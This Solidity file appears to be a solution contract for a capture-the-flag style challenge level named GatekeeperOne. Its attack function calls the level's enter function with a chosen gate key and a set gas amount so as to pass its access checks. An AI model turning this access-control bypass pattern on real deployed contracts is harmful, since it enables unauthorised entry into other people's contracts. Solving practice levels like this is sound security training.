// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../levels/GatekeeperOne.sol";

contract GatekeeperOneAttack {
    function attack(
        address target,
        bytes8 gateKey,
        uint256 _gas
    ) public {
        GatekeeperOne(target).enter{gas: _gas}(gateKey);
    }
}
